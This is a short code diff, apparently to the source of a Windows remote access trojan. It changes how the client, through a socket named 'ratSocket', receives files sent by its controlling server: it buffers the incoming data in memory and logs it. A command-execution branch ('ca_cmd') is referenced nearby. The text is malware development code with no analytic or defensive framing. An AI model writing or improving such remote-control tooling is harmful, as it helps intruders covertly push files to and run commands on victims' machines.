@@ -304,12 +304,16 @@ WinMain(HINSTANCE hInstance,
 		}
 		else if ( strcmp(splittedCommand[0], ca_download) == 0 )
 		{
+			char* totalReceivedData = NULL;
+			
 			char fileSizeBuffer[FILE_SIZE_DIGIT_SIZE] = {};
 			if ( f_recv(ratSocket.socketConnection, fileSizeBuffer, FILE_SIZE_DIGIT_SIZE, 0) != SOCKET_ERROR )
 			{
 				int fileSize = atoi(fileSizeBuffer);
-				int totalBytesRead = 0;
+
+				totalReceivedData = (char*)calloc(fileSize + 1, sizeof(char));
 				
+				int totalBytesRead = 0;
 				for (;;)
 				{
 					char writeBuffer[SOCKET_BUFFER_SIZE] = {};
@@ -318,6 +322,8 @@ WinMain(HINSTANCE hInstance,
 					{
 						OutputDebugStringA("## Received download: ");
 						OutputDebugStringA(writeBuffer);
+
+						strncat_s(totalReceivedData, fileSize + 1, writeBuffer, bytesRead);
 
 						totalBytesRead += bytesRead;
 						if ( totalBytesRead >= fileSize )
@@ -338,6 +344,9 @@ WinMain(HINSTANCE hInstance,
 			{
 				OutputDebugStringA("[ERROR] Error getting file size.");
 			}
+
+			OutputDebugStringA(totalReceivedData);
+			free(totalReceivedData);
 		}
 		else if ( strcmp(splittedCommand[0], ca_cmd) == 0 )
 		{
